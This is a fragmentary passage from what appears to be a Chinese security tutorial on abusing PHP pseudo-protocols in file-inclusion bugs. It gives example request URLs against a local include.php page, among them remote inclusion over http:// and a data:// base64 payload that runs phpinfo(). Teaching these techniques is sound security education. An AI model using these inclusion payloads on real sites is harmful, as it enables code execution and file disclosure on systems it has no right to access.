...
*   **示例**：
    ...
    1.  `file://[文件的绝对路径和文件名]`
        ...
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/001.png)
        
    2.  `[文件的相对路径和文件名]`
        
        http://127.0.0.1/include.php?file=./phpinfo.txt
        
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/002.png)
        
    3.  `[http：//网络路径和文件名]`
        
        http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
        
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/003.png)
...
*   **示例**：
    ...
    1.  `zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）
        ...
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/007.png)
    ...
    2.  `compress.bzip2://file.bz2`
        ...
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/008.png)
    ...
    3.  `compress.zlib://file.gz`
        ...
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/009.png)
...
*   **示例**：
    ...
    1.  `data://text/plain,`
        ...
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/010.png)
        
    2.  `data://text/plain;base64,`
        
        http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
        
        ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/011.png)
...
*   **示例**：
    ...
    ![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/012.png)
...
![图片描述](/assets/images/posts/网安/漏洞专题/PHP伪协议总结/013.png)
